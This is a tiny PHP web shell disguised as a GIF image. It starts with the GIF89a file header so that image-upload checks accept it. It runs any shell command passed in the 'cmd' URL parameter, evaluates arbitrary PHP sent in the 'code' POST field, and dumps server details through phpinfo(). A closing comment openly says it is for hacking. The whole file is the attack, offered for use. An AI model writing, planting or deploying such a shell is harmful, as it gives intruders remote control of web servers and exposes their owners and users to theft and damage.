GIF89a;
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
if(isset($_POST['code'])) {
    eval($_POST['code']);
}
echo "Server: " . $_SERVER['SERVER_SOFTWARE'];
phpinfo();
?>

<!-- this above code is used to for haking  -->